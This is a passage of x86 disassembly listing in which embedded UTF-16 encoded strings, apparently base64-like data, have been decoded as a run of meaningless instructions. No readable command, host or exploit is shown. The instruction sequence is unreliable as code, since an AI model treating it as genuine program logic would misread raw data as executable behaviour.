  40add9:	00 32                	add    %dh,(%edx)
  40addb:	00 50 00             	add    %dl,0x0(%eax)
  40adde:	76 00                	jbe    0x40ade0
  40ade0:	35 00 77 00 65       	xor    $0x65007700,%eax
  40ade5:	00 63 00             	add    %ah,0x0(%ebx)
  40ade8:	7a 00                	jp     0x40adea
  40adea:	47                   	inc    %edi
  40adeb:	00 57 00             	add    %dl,0x0(%edi)
  40adee:	38 00                	cmp    %al,(%eax)
  40adf0:	7a 00                	jp     0x40adf2
  40adf2:	54                   	push   %esp
  40adf3:	00 37                	add    %dh,(%edi)
  40adf5:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
  40adf9:	00 70 00             	add    %dh,0x0(%eax)
  40adfc:	54                   	push   %esp
  40adfd:	00 49 00             	add    %cl,0x0(%ecx)
  40ae00:	71 00                	jno    0x40ae02
  40ae02:	55                   	push   %ebp
  40ae03:	00 69 00             	add    %ch,0x0(%ecx)
  40ae06:	77 00                	ja     0x40ae08
  40ae08:	38 00                	cmp    %al,(%eax)
  40ae0a:	51                   	push   %ecx
  40ae0b:	00 6d 00             	add    %ch,0x0(%ebp)
  40ae0e:	57                   	push   %edi
  40ae0f:	00 74 00 42          	add    %dh,0x42(%eax,%eax,1)
  40ae13:	00 66 00             	add    %ah,0x0(%esi)
  40ae16:	4f                   	dec    %edi
  40ae17:	00 6b 00             	add    %ch,0x0(%ebx)
  40ae1a:	42                   	inc    %edx
  40ae1b:	00 37                	add    %dh,(%edi)
  40ae1d:	00 6c 00 2b          	add    %ch,0x2b(%eax,%eax,1)
  40ae21:	00 46 00             	add    %al,0x0(%esi)
  40ae24:	53                   	push   %ebx
  40ae25:	00 39                	add    %bh,(%ecx)
  40ae27:	00 74 00 4a          	add    %dh,0x4a(%eax,%eax,1)
  40ae2b:	00 6b 00             	add    %ch,0x0(%ebx)
  40ae2e:	44                   	inc    %esp
  40ae2f:	00 44 00 52          	add    %al,0x52(%eax,%eax,1)
  40ae33:	00 33                	add    %dh,(%ebx)
  40ae35:	00 46 00             	add    %al,0x0(%esi)
  40ae38:	67 00 44 00          	add    %al,0x0(%si)
  40ae3c:	75 00                	jne    0x40ae3e
  40ae3e:	6c                   	insb   (%dx),%es:(%edi)
  40ae3f:	00 57 00             	add    %dl,0x0(%edi)
  40ae42:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40ae46:	5a                   	pop    %edx
  40ae47:	00 33                	add    %dh,(%ebx)
  40ae49:	00 77 00             	add    %dh,0x0(%edi)
  40ae4c:	42                   	inc    %edx
  40ae4d:	00 4b 00             	add    %cl,0x0(%ebx)
  40ae50:	30 00                	xor    %al,(%eax)
  40ae52:	35 00 64 00 50       	xor    $0x50006400,%eax
  40ae57:	00 46 00             	add    %al,0x0(%esi)
  40ae5a:	41                   	inc    %ecx
  40ae5b:	00 35 00 2f 00 6c    	add    %dh,0x6c002f00
  40ae61:	00 49 00             	add    %cl,0x0(%ecx)
  40ae64:	77 00                	ja     0x40ae66
  40ae66:	70 00                	jo     0x40ae68
  40ae68:	42                   	inc    %edx
  40ae69:	00 51 00             	add    %dl,0x0(%ecx)
  40ae6c:	42                   	inc    %edx
  40ae6d:	00 6c 00 41          	add    %ch,0x41(%eax,%eax,1)
  40ae71:	00 79 00             	add    %bh,0x0(%ecx)
  40ae74:	58                   	pop    %eax
  40ae75:	00 44 00 30          	add    %al,0x30(%eax,%eax,1)
  40ae79:	00 63 00             	add    %ah,0x0(%ebx)
  40ae7c:	59                   	pop    %ecx
  40ae7d:	00 4f 00             	add    %cl,0x0(%edi)
  40ae80:	74 00                	je     0x40ae82
  40ae82:	6d                   	insl   (%dx),%es:(%edi)
  40ae83:	00 57 00             	add    %dl,0x0(%edi)
  40ae86:	78 00                	js     0x40ae88
  40ae88:	79 00                	jns    0x40ae8a
  40ae8a:	4c                   	dec    %esp
  40ae8b:	00 52 00             	add    %dl,0x0(%edx)
  40ae8e:	77 00                	ja     0x40ae90
  40ae90:	44                   	inc    %esp
  40ae91:	00 42 00             	add    %al,0x0(%edx)
  40ae94:	4a                   	dec    %edx
  40ae95:	00 6e 00             	add    %ch,0x0(%esi)
  40ae98:	77 00                	ja     0x40ae9a
  40ae9a:	44                   	inc    %esp
  40ae9b:	00 56 00             	add    %dl,0x0(%esi)
  40ae9e:	77 00                	ja     0x40aea0
  40aea0:	6e                   	outsb  %ds:(%esi),(%dx)
  40aea1:	00 62 00             	add    %ah,0x0(%edx)
  40aea4:	55                   	push   %ebp
  40aea5:	00 76 00             	add    %dh,0x0(%esi)
  40aea8:	37                   	aaa
  40aea9:	00 6e 00             	add    %ch,0x0(%esi)
  40aeac:	34 00                	xor    $0x0,%al
  40aeae:	74 00                	je     0x40aeb0
  40aeb0:	54                   	push   %esp
  40aeb1:	00 73 00             	add    %dh,0x0(%ebx)
  40aeb4:	2b 00                	sub    (%eax),%eax
  40aeb6:	76 00                	jbe    0x40aeb8
  40aeb8:	6c                   	insb   (%dx),%es:(%edi)
  40aeb9:	00 2b                	add    %ch,(%ebx)
  40aebb:	00 36                	add    %dh,(%esi)
  40aebd:	00 70 00             	add    %dh,0x0(%eax)
  40aec0:	59                   	pop    %ecx
  40aec1:	00 77 00             	add    %dh,0x0(%edi)
  40aec4:	47                   	inc    %edi
  40aec5:	00 39                	add    %bh,(%ecx)
  40aec7:	00 67 00             	add    %ah,0x0(%edi)
  40aeca:	77 00                	ja     0x40aecc
  40aecc:	78 00                	js     0x40aece
  40aece:	46                   	inc    %esi
  40aecf:	00 73 00             	add    %dh,0x0(%ebx)
  40aed2:	53                   	push   %ebx
  40aed3:	00 72 00             	add    %dh,0x0(%edx)
  40aed6:	45                   	inc    %ebp
  40aed7:	00 52 00             	add    %dl,0x0(%edx)
  40aeda:	77 00                	ja     0x40aedc
  40aedc:	7a 00                	jp     0x40aede
  40aede:	2b 00                	sub    (%eax),%eax
  40aee0:	31 00                	xor    %eax,(%eax)
  40aee2:	47                   	inc    %edi
  40aee3:	00 31                	add    %dh,(%ecx)
  40aee5:	00 44 00 42          	add    %al,0x42(%eax,%eax,1)
  40aee9:	00 6d 00             	add    %ch,0x0(%ebp)
  40aeec:	61                   	popa
  40aeed:	00 71 00             	add    %dh,0x0(%ecx)
  40aef0:	53                   	push   %ebx
  40aef1:	00 4f 00             	add    %cl,0x0(%edi)
  40aef4:	70 00                	jo     0x40aef6
  40aef6:	6d                   	insl   (%dx),%es:(%edi)
  40aef7:	00 30                	add    %dh,(%eax)
  40aef9:	00 4d 00             	add    %cl,0x0(%ebp)
  40aefc:	38 00                	cmp    %al,(%eax)
  40aefe:	57                   	push   %edi
  40aeff:	00 58 00             	add    %bl,0x0(%eax)
  40af02:	47                   	inc    %edi
  40af03:	00 4b 00             	add    %cl,0x0(%ebx)
  40af06:	6c                   	insb   (%dx),%es:(%edi)
  40af07:	00 6d 00             	add    %ch,0x0(%ebp)
  40af0a:	41                   	inc    %ecx
  40af0b:	00 2f                	add    %ch,(%edi)
  40af0d:	00 46 00             	add    %al,0x0(%esi)
  40af10:	6c                   	insb   (%dx),%es:(%edi)
  40af11:	00 70 00             	add    %dh,0x0(%eax)
  40af14:	64 00 76 00          	add    %dh,%fs:0x0(%esi)
  40af18:	68 00 75 00 79       	push   $0x79007500
  40af1d:	00 59 00             	add    %bl,0x0(%ecx)
  40af20:	69 00 4f 00 52 00    	imul   $0x52004f,(%eax),%eax
  40af26:	32 00                	xor    (%eax),%al
  40af28:	32 00                	xor    (%eax),%al
  40af2a:	4d                   	dec    %ebp
  40af2b:	00 34 00             	add    %dh,(%eax,%eax,1)
  40af2e:	5a                   	pop    %edx
  40af2f:	00 6e 00             	add    %ch,0x0(%esi)
  40af32:	58                   	pop    %eax
  40af33:	00 33                	add    %dh,(%ebx)
  40af35:	00 37                	add    %dh,(%edi)
  40af37:	00 66 00             	add    %ah,0x0(%esi)
  40af3a:	70 00                	jo     0x40af3c
  40af3c:	51                   	push   %ecx
  40af3d:	00 4d 00             	add    %cl,0x0(%ebp)
  40af40:	2f                   	das
  40af41:	00 32                	add    %dh,(%edx)
  40af43:	00 7a 00             	add    %bh,0x0(%edx)
  40af46:	4f                   	dec    %edi
  40af47:	00 76 00             	add    %dh,0x0(%esi)
  40af4a:	65 00 48 00          	add    %cl,%gs:0x0(%eax)
  40af4e:	66 00 67 00          	data16 add %ah,0x0(%edi)
  40af52:	35 00 71 00 2b       	xor    $0x2b007100,%eax
  40af57:	00 5a 00             	add    %bl,0x0(%edx)
  40af5a:	69 00 47 00 33 00    	imul   $0x330047,(%eax),%eax
  40af60:	42                   	inc    %edx
  40af61:	00 53 00             	add    %dl,0x0(%ebx)
  40af64:	6a 00                	push   $0x0
  40af66:	75 00                	jne    0x40af68
  40af68:	35 00 6f 00 56       	xor    $0x56006f00,%eax
  40af6d:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40af71:	00 70 00             	add    %dh,0x0(%eax)
  40af74:	75 00                	jne    0x40af76
  40af76:	51                   	push   %ecx
  40af77:	00 48 00             	add    %cl,0x0(%eax)
  40af7a:	56                   	push   %esi
  40af7b:	00 51 00             	add    %dl,0x0(%ecx)
  40af7e:	51                   	push   %ecx
  40af7f:	00 50 00             	add    %dl,0x0(%eax)
  40af82:	4b                   	dec    %ebx
  40af83:	00 61 00             	add    %ah,0x0(%ecx)
  40af86:	44                   	inc    %esp
  40af87:	00 37                	add    %dh,(%edi)
  40af89:	00 72 00             	add    %dh,0x0(%edx)
  40af8c:	78 00                	js     0x40af8e
  40af8e:	36 00 2b             	add    %ch,%ss:(%ebx)
  40af91:	00 38                	add    %bh,(%eax)
  40af93:	00 6e 00             	add    %ch,0x0(%esi)
  40af96:	4e                   	dec    %esi
  40af97:	00 59 00             	add    %bl,0x0(%ecx)
  40af9a:	71 00                	jno    0x40af9c
  40af9c:	4b                   	dec    %ebx
  40af9d:	00 6f 00             	add    %ch,0x0(%edi)
  40afa0:	32 00                	xor    (%eax),%al
  40afa2:	6e                   	outsb  %ds:(%esi),(%dx)
  40afa3:	00 63 00             	add    %ah,0x0(%ebx)
  40afa6:	67 00 54 00          	add    %dl,0x0(%si)
  40afaa:	53                   	push   %ebx
  40afab:	00 36                	add    %dh,(%esi)
  40afad:	00 39                	add    %bh,(%ecx)
  40afaf:	00 41 00             	add    %al,0x0(%ecx)
  40afb2:	73 00                	jae    0x40afb4
  40afb4:	4d                   	dec    %ebp
  40afb5:	00 75 00             	add    %dh,0x0(%ebp)
  40afb8:	73 00                	jae    0x40afba
  40afba:	45                   	inc    %ebp
  40afbb:	00 35 00 38 00 78    	add    %dh,0x78003800
  40afc1:	00 47 00             	add    %al,0x0(%edi)
  40afc4:	52                   	push   %edx
  40afc5:	00 73 00             	add    %dh,0x0(%ebx)
  40afc8:	51                   	push   %ecx
  40afc9:	00 36                	add    %dh,(%esi)
  40afcb:	00 7a 00             	add    %bh,0x0(%edx)
  40afce:	4e                   	dec    %esi
  40afcf:	00 71 00             	add    %dh,0x0(%ecx)
  40afd2:	50                   	push   %eax
  40afd3:	00 6d 00             	add    %ch,0x0(%ebp)
  40afd6:	41                   	inc    %ecx
  40afd7:	00 6f 00             	add    %ch,0x0(%edi)
  40afda:	58                   	pop    %eax
  40afdb:	00 4f 00             	add    %cl,0x0(%edi)
  40afde:	51                   	push   %ecx
  40afdf:	00 77 00             	add    %dh,0x0(%edi)
  40afe2:	61                   	popa
  40afe3:	00 68 00             	add    %ch,0x0(%eax)
  40afe6:	68 00 41 00 46       	push   $0x46004100
  40afeb:	00 4b 00             	add    %cl,0x0(%ebx)
  40afee:	67 00 41 00          	add    %al,0x0(%bx,%di)
  40aff2:	59                   	pop    %ecx
  40aff3:	00 2b                	add    %ch,(%ebx)
  40aff5:	00 56 00             	add    %dl,0x0(%esi)
  40aff8:	49                   	dec    %ecx
  40aff9:	00 4c 00 67          	add    %cl,0x67(%eax,%eax,1)
  40affd:	00 77 00             	add    %dh,0x0(%edi)
  40b000:	36 00 41 00          	add    %al,%ss:0x0(%ecx)
  40b004:	52                   	push   %edx
  40b005:	00 4d 00             	add    %cl,0x0(%ebp)
  40b008:	39 00                	cmp    %eax,(%eax)
  40b00a:	43                   	inc    %ebx
  40b00b:	00 4c 00 7a          	add    %cl,0x7a(%eax,%eax,1)
  40b00f:	00 76 00             	add    %dh,0x0(%esi)
  40b012:	4a                   	dec    %edx
  40b013:	00 78 00             	add    %bh,0x0(%eax)
  40b016:	57                   	push   %edi
  40b017:	00 46 00             	add    %al,0x0(%esi)
  40b01a:	47                   	inc    %edi
  40b01b:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  40b01f:	00 73 00             	add    %dh,0x0(%ebx)
  40b022:	6e                   	outsb  %ds:(%esi),(%dx)
  40b023:	00 30                	add    %dh,(%eax)
  40b025:	00 37                	add    %dh,(%edi)
  40b027:	00 2b                	add    %ch,(%ebx)
  40b029:	00 62 00             	add    %ah,0x0(%edx)
  40b02c:	33 00                	xor    (%eax),%eax
  40b02e:	71 00                	jno    0x40b030
  40b030:	34 00                	xor    $0x0,%al
  40b032:	31 00                	xor    %eax,(%eax)
  40b034:	73 00                	jae    0x40b036
  40b036:	69 00 67 00 51 00    	imul   $0x510067,(%eax),%eax
  40b03c:	48                   	dec    %eax
  40b03d:	00 43 00             	add    %al,0x0(%ebx)
  40b040:	68 00 67 00 56       	push   $0x56006700
  40b045:	00 47 00             	add    %al,0x0(%edi)
  40b048:	35 00 36 00 50       	xor    $0x50003600,%eax
  40b04d:	00 47 00             	add    %al,0x0(%edi)
  40b050:	6a 00                	push   $0x0
  40b052:	52                   	push   %edx
  40b053:	00 52 00             	add    %dl,0x0(%edx)
  40b056:	72 00                	jb     0x40b058
  40b058:	33 00                	xor    (%eax),%eax
  40b05a:	37                   	aaa
  40b05b:	00 44 00 4b          	add    %al,0x4b(%eax,%eax,1)
  40b05f:	00 67 00             	add    %ah,0x0(%edi)
  40b062:	31 00                	xor    %eax,(%eax)
  40b064:	53                   	push   %ebx
  40b065:	00 63 00             	add    %ah,0x0(%ebx)
  40b068:	70 00                	jo     0x40b06a
  40b06a:	4a                   	dec    %edx
  40b06b:	00 31                	add    %dh,(%ecx)
  40b06d:	00 39                	add    %bh,(%ecx)
  40b06f:	00 5a 00             	add    %bl,0x0(%edx)
  40b072:	35 00 6e 00 79       	xor    $0x79006e00,%eax
  40b077:	00 32                	add    %dh,(%edx)
  40b079:	00 58 00             	add    %bl,0x0(%eax)
  40b07c:	61                   	popa
  40b07d:	00 73 00             	add    %dh,0x0(%ebx)
  40b080:	79 00                	jns    0x40b082
  40b082:	71 00                	jno    0x40b084
  40b084:	4b                   	dec    %ebx
  40b085:	00 70 00             	add    %dh,0x0(%eax)
  40b088:	77 00                	ja     0x40b08a
  40b08a:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  40b08e:	4f                   	dec    %edi
  40b08f:	00 73 00             	add    %dh,0x0(%ebx)
  40b092:	50                   	push   %eax
  40b093:	00 49 00             	add    %cl,0x0(%ecx)
  40b096:	58                   	pop    %eax
  40b097:	00 32                	add    %dh,(%edx)
  40b099:	00 43 00             	add    %al,0x0(%ebx)
  40b09c:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  40b0a0:	68 00 78 00 36       	push   $0x36007800
  40b0a5:	00 57 00             	add    %dl,0x0(%edi)
  40b0a8:	55                   	push   %ebp
  40b0a9:	00 53 00             	add    %dl,0x0(%ebx)
  40b0ac:	4e                   	dec    %esi
  40b0ad:	00 39                	add    %bh,(%ecx)
  40b0af:	00 2b                	add    %ch,(%ebx)
  40b0b1:	00 7a 00             	add    %bh,0x0(%edx)
  40b0b4:	77 00                	ja     0x40b0b6
  40b0b6:	39 00                	cmp    %eax,(%eax)
  40b0b8:	4c                   	dec    %esp
  40b0b9:	00 74 00 37          	add    %dh,0x37(%eax,%eax,1)
  40b0bd:	00 46 00             	add    %al,0x0(%esi)
  40b0c0:	69 00 64 00 6e 00    	imul   $0x6e0064,(%eax),%eax
  40b0c6:	65 00 5a 00          	add    %bl,%gs:0x0(%edx)
  40b0ca:	42                   	inc    %edx
  40b0cb:	00 6a 00             	add    %ch,0x0(%edx)
  40b0ce:	37                   	aaa
  40b0cf:	00 78 00             	add    %bh,0x0(%eax)
  40b0d2:	57                   	push   %edi
  40b0d3:	00 57 00             	add    %dl,0x0(%edi)
  40b0d6:	7a 00                	jp     0x40b0d8
  40b0d8:	47                   	inc    %edi
  40b0d9:	00 39                	add    %bh,(%ecx)
  40b0db:	00 69 00             	add    %ch,0x0(%ecx)
  40b0de:	4e                   	dec    %esi
  40b0df:	00 37                	add    %dh,(%edi)
  40b0e1:	00 6e 00             	add    %ch,0x0(%esi)
  40b0e4:	57                   	push   %edi
  40b0e5:	00 6c 00 79          	add    %ch,0x79(%eax,%eax,1)
  40b0e9:	00 71 00             	add    %dh,0x0(%ecx)
  40b0ec:	2b 00                	sub    (%eax),%eax
  40b0ee:	74 00                	je     0x40b0f0
  40b0f0:	77 00                	ja     0x40b0f2
  40b0f2:	6a 00                	push   $0x0
  40b0f4:	37                   	aaa
  40b0f5:	00 62 00             	add    %ah,0x0(%edx)
  40b0f8:	4a                   	dec    %edx
  40b0f9:	00 57 00             	add    %dl,0x0(%edi)
  40b0fc:	4f                   	dec    %edi
  40b0fd:	00 64 00 37          	add    %ah,0x37(%eax,%eax,1)
  40b101:	00 4d 00             	add    %cl,0x0(%ebp)
  40b104:	2b 00                	sub    (%eax),%eax
  40b106:	4f                   	dec    %edi
  40b107:	00 4d 00             	add    %cl,0x0(%ebp)
  40b10a:	73 00                	jae    0x40b10c
  40b10c:	30 00                	xor    %al,(%eax)
  40b10e:	49                   	dec    %ecx
  40b10f:	00 70 00             	add    %dh,0x0(%eax)
  40b112:	66 00 30             	data16 add %dh,(%eax)
  40b115:	00 49 00             	add    %cl,0x0(%ecx)
  40b118:	2f                   	das
  40b119:	00 57 00             	add    %dl,0x0(%edi)
  40b11c:	68 00 48 00 41       	push   $0x41004800
  40b121:	00 75 00             	add    %dh,0x0(%ebp)
  40b124:	2b 00                	sub    (%eax),%eax
  40b126:	35 00 4d 00 78       	xor    $0x78004d00,%eax
  40b12b:	00 31                	add    %dh,(%ecx)
  40b12d:	00 32                	add    %dh,(%edx)
  40b12f:	00 63 00             	add    %ah,0x0(%ebx)
  40b132:	79 00                	jns    0x40b134
  40b134:	34 00                	xor    $0x0,%al
  40b136:	41                   	inc    %ecx
  40b137:	00 31                	add    %dh,(%ecx)
  40b139:	00 66 00             	add    %ah,0x0(%esi)
  40b13c:	79 00                	jns    0x40b13e
  40b13e:	6b 00 48             	imul   $0x48,(%eax),%eax
  40b141:	00 57 00             	add    %dl,0x0(%edi)
  40b144:	70 00                	jo     0x40b146
  40b146:	68 00 53 00 68       	push   $0x68005300
  40b14b:	00 35 00 2b 00 32    	add    %dh,0x32002b00
  40b151:	00 6f 00             	add    %ch,0x0(%edi)
  40b154:	57                   	push   %edi
  40b155:	00 38                	add    %bh,(%eax)
  40b157:	00 69 00             	add    %ch,0x0(%ecx)
  40b15a:	56                   	push   %esi
  40b15b:	00 55 00             	add    %dl,0x0(%ebp)
  40b15e:	53                   	push   %ebx
  40b15f:	00 6b 00             	add    %ch,0x0(%ebx)
  40b162:	71 00                	jno    0x40b164
  40b164:	37                   	aaa
  40b165:	00 49 00             	add    %cl,0x0(%ecx)
  40b168:	31 00                	xor    %eax,(%eax)
  40b16a:	52                   	push   %edx
  40b16b:	00 2b                	add    %ch,(%ebx)
  40b16d:	00 54 00 4d          	add    %dl,0x4d(%eax,%eax,1)
  40b171:	00 53 00             	add    %dl,0x0(%ebx)
  40b174:	59                   	pop    %ecx
  40b175:	00 37                	add    %dh,(%edi)
  40b177:	00 59 00             	add    %bl,0x0(%ecx)
  40b17a:	75 00                	jne    0x40b17c
  40b17c:	43                   	inc    %ebx
  40b17d:	00 4e 00             	add    %cl,0x0(%esi)
  40b180:	6d                   	insl   (%dx),%es:(%edi)
  40b181:	00 59 00             	add    %bl,0x0(%ecx)
  40b184:	69 00 52 00 57 00    	imul   $0x570052,(%eax),%eax
  40b18a:	64 00 30             	add    %dh,%fs:(%eax)
  40b18d:	00 6e 00             	add    %ch,0x0(%esi)
  40b190:	6a 00                	push   $0x0
  40b192:	34 00                	xor    $0x0,%al
  40b194:	72 00                	jb     0x40b196
  40b196:	58                   	pop    %eax
  40b197:	00 46 00             	add    %al,0x0(%esi)
  40b19a:	71 00                	jno    0x40b19c
  40b19c:	57                   	push   %edi
  40b19d:	00 78 00             	add    %bh,0x0(%eax)
  40b1a0:	59                   	pop    %ecx
  40b1a1:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b1a4:	4d                   	dec    %ebp
  40b1a5:	00 4d 00             	add    %cl,0x0(%ebp)
  40b1a8:	32 00                	xor    (%eax),%al
  40b1aa:	7a 00                	jp     0x40b1ac
  40b1ac:	58                   	pop    %eax
  40b1ad:	00 74 00 31          	add    %dh,0x31(%eax,%eax,1)
  40b1b1:	00 63 00             	add    %ah,0x0(%ebx)
  40b1b4:	6c                   	insb   (%dx),%es:(%edi)
  40b1b5:	00 6f 00             	add    %ch,0x0(%edi)
  40b1b8:	68 00 46 00 66       	push   $0x66004600
  40b1bd:	00 6a 00             	add    %ch,0x0(%edx)
  40b1c0:	6b 00 48             	imul   $0x48,(%eax),%eax
  40b1c3:	00 36                	add    %dh,(%esi)
  40b1c5:	00 76 00             	add    %dh,0x0(%esi)
  40b1c8:	2f                   	das
  40b1c9:	00 76 00             	add    %dh,0x0(%esi)
  40b1cc:	68 00 77 00 30       	push   $0x30007700
  40b1d1:	00 53 00             	add    %dl,0x0(%ebx)
  40b1d4:	42                   	inc    %edx
  40b1d5:	00 6b 00             	add    %ch,0x0(%ebx)
  40b1d8:	50                   	push   %eax
  40b1d9:	00 76 00             	add    %dh,0x0(%esi)
  40b1dc:	6a 00                	push   $0x0
  40b1de:	44                   	inc    %esp
  40b1df:	00 57 00             	add    %dl,0x0(%edi)
  40b1e2:	39 00                	cmp    %eax,(%eax)
  40b1e4:	75 00                	jne    0x40b1e6
  40b1e6:	73 00                	jae    0x40b1e8
  40b1e8:	55                   	push   %ebp
  40b1e9:	00 44 00 6b          	add    %al,0x6b(%eax,%eax,1)
  40b1ed:	00 62 00             	add    %ah,0x0(%edx)
  40b1f0:	37                   	aaa
  40b1f1:	00 47 00             	add    %al,0x0(%edi)
  40b1f4:	70 00                	jo     0x40b1f6
  40b1f6:	75 00                	jne    0x40b1f8
  40b1f8:	2f                   	das
  40b1f9:	00 2f                	add    %ch,(%edi)
  40b1fb:	00 65 00             	add    %ah,0x0(%ebp)
  40b1fe:	43                   	inc    %ebx
  40b1ff:	00 41 00             	add    %al,0x0(%ecx)
  40b202:	3d 00 00 87 b1       	cmp    $0xb1870000,%eax
  40b207:	36 00 79 00          	add    %bh,%ss:0x0(%ecx)
  40b20b:	69 00 5a 00 37 00    	imul   $0x37005a,(%eax),%eax
  40b211:	6f                   	outsl  %ds:(%esi),(%dx)
  40b212:	00 65 00             	add    %ah,0x0(%ebp)
  40b215:	5a                   	pop    %edx
  40b216:	00 72 00             	add    %dh,0x0(%edx)
  40b219:	42                   	inc    %edx
  40b21a:	00 51 00             	add    %dl,0x0(%ecx)
  40b21d:	71 00                	jno    0x40b21f
  40b21f:	2f                   	das
  40b220:	00 6b 00             	add    %ch,0x0(%ebx)
  40b223:	38 00                	cmp    %al,(%eax)
  40b225:	64 00 6a 00          	add    %ch,%fs:0x0(%edx)
  40b229:	71 00                	jno    0x40b22b
  40b22b:	69 00 44 00 33 00    	imul   $0x330044,(%eax),%eax
  40b231:	77 00                	ja     0x40b233
  40b233:	49                   	dec    %ecx
  40b234:	00 51 00             	add    %dl,0x0(%ecx)
  40b237:	4b                   	dec    %ebx
  40b238:	00 74 00 47          	add    %dh,0x47(%eax,%eax,1)
  40b23c:	00 71 00             	add    %dh,0x0(%ecx)
  40b23f:	4e                   	dec    %esi
  40b240:	00 78 00             	add    %bh,0x0(%eax)
  40b243:	65 00 2b             	add    %ch,%gs:(%ebx)
  40b246:	00 31                	add    %dh,(%ecx)
  40b248:	00 4a 00             	add    %cl,0x0(%edx)
  40b24b:	36 00 45 00          	add    %al,%ss:0x0(%ebp)
  40b24f:	31 00                	xor    %eax,(%eax)
  40b251:	37                   	aaa
  40b252:	00 4d 00             	add    %cl,0x0(%ebp)
  40b255:	38 00                	cmp    %al,(%eax)
  40b257:	32 00                	xor    (%eax),%al
  40b259:	76 00                	jbe    0x40b25b
  40b25b:	33 00                	xor    (%eax),%eax
  40b25d:	6d                   	insl   (%dx),%es:(%edi)
  40b25e:	00 64 00 66          	add    %ah,0x66(%eax,%eax,1)
  40b262:	00 6c 00 56          	add    %ch,0x56(%eax,%eax,1)
  40b266:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b269:	6c                   	insb   (%dx),%es:(%edi)
  40b26a:	00 44 00 66          	add    %al,0x66(%eax,%eax,1)
  40b26e:	00 51 00             	add    %dl,0x0(%ecx)
  40b271:	77 00                	ja     0x40b273
  40b273:	64 00 6c 00 49       	add    %ch,%fs:0x49(%eax,%eax,1)
  40b278:	00 71 00             	add    %dh,0x0(%ecx)
  40b27b:	37                   	aaa
  40b27c:	00 54 00 73          	add    %dl,0x73(%eax,%eax,1)
  40b280:	00 4f 00             	add    %cl,0x0(%edi)
  40b283:	39 00                	cmp    %eax,(%eax)
  40b285:	68 00 6b 00 4a       	push   $0x4a006b00
  40b28a:	00 4e 00             	add    %cl,0x0(%esi)
  40b28d:	6f                   	outsl  %ds:(%esi),(%dx)
  40b28e:	00 45 00             	add    %al,0x0(%ebp)
  40b291:	64 00 4e 00          	add    %cl,%fs:0x0(%esi)
  40b295:	75 00                	jne    0x40b297
  40b297:	74 00                	je     0x40b299
  40b299:	64 00 43 00          	add    %al,%fs:0x0(%ebx)
  40b29d:	37                   	aaa
  40b29e:	00 32                	add    %dh,(%edx)
  40b2a0:	00 42 00             	add    %al,0x0(%edx)
  40b2a3:	78 00                	js     0x40b2a5
  40b2a5:	65 00 4e 00          	add    %cl,%gs:0x0(%esi)
  40b2a9:	2f                   	das
  40b2aa:	00 32                	add    %dh,(%edx)
  40b2ac:	00 54 00 42          	add    %dl,0x42(%eax,%eax,1)
  40b2b0:	00 69 00             	add    %ch,0x0(%ecx)
  40b2b3:	5a                   	pop    %edx
  40b2b4:	00 30                	add    %dh,(%eax)
  40b2b6:	00 70 00             	add    %dh,0x0(%eax)
  40b2b9:	42                   	inc    %edx
  40b2ba:	00 6b 00             	add    %ch,0x0(%ebx)
  40b2bd:	69 00 6e 00 6c 00    	imul   $0x6c006e,(%eax),%eax
  40b2c3:	53                   	push   %ebx
  40b2c4:	00 48 00             	add    %cl,0x0(%eax)
  40b2c7:	55                   	push   %ebp
  40b2c8:	00 6c 00 31          	add    %ch,0x31(%eax,%eax,1)
  40b2cc:	00 31                	add    %dh,(%ecx)
  40b2ce:	00 47 00             	add    %al,0x0(%edi)
  40b2d1:	42                   	inc    %edx
  40b2d2:	00 6c 00 4d          	add    %ch,0x4d(%eax,%eax,1)
  40b2d6:	00 59 00             	add    %bl,0x0(%ecx)
  40b2d9:	67 00 57 00          	add    %dl,0x0(%bx)
  40b2dd:	66 00 35 00 56 00 4b 	data16 add %dh,0x4b005600
  40b2e4:	00 57 00             	add    %dl,0x0(%edi)
  40b2e7:	55                   	push   %ebp
  40b2e8:	00 6c 00 71          	add    %ch,0x71(%eax,%eax,1)
  40b2ec:	00 4e 00             	add    %cl,0x0(%esi)
  40b2ef:	79 00                	jns    0x40b2f1
  40b2f1:	44                   	inc    %esp
  40b2f2:	00 77 00             	add    %dh,0x0(%edi)
  40b2f5:	74 00                	je     0x40b2f7
  40b2f7:	2b 00                	sub    (%eax),%eax
  40b2f9:	47                   	inc    %edi
  40b2fa:	00 54 00 56          	add    %dl,0x56(%eax,%eax,1)
  40b2fe:	00 39                	add    %bh,(%ecx)
  40b300:	00 41 00             	add    %al,0x0(%ecx)
  40b303:	54                   	push   %esp
  40b304:	00 72 00             	add    %dh,0x0(%edx)
  40b307:	72 00                	jb     0x40b309
  40b309:	78 00                	js     0x40b30b
  40b30b:	44                   	inc    %esp
  40b30c:	00 51 00             	add    %dl,0x0(%ecx)
  40b30f:	39 00                	cmp    %eax,(%eax)
  40b311:	54                   	push   %esp
  40b312:	00 4f 00             	add    %cl,0x0(%edi)
  40b315:	6f                   	outsl  %ds:(%esi),(%dx)
  40b316:	00 58 00             	add    %bl,0x0(%eax)
  40b319:	70 00                	jo     0x40b31b
  40b31b:	5a                   	pop    %edx
  40b31c:	00 37                	add    %dh,(%edi)
  40b31e:	00 4a 00             	add    %cl,0x0(%edx)
  40b321:	4f                   	dec    %edi
  40b322:	00 2b                	add    %ch,(%ebx)
  40b324:	00 76 00             	add    %dh,0x0(%esi)
  40b327:	59                   	pop    %ecx
  40b328:	00 79 00             	add    %bh,0x0(%ecx)
  40b32b:	62 00                	bound  %eax,(%eax)
  40b32d:	65 00 2f             	add    %ch,%gs:(%edi)
  40b330:	00 6c 00 4d          	add    %ch,0x4d(%eax,%eax,1)
  40b334:	00 41 00             	add    %al,0x0(%ecx)
  40b337:	39 00                	cmp    %eax,(%eax)
  40b339:	33 00                	xor    (%eax),%eax
  40b33b:	4b                   	dec    %ebx
  40b33c:	00 51 00             	add    %dl,0x0(%ecx)
  40b33f:	53                   	push   %ebx
  40b340:	00 6b 00             	add    %ch,0x0(%ebx)
  40b343:	76 00                	jbe    0x40b345
  40b345:	77 00                	ja     0x40b347
  40b347:	6f                   	outsl  %ds:(%esi),(%dx)
  40b348:	00 66 00             	add    %ah,0x0(%esi)
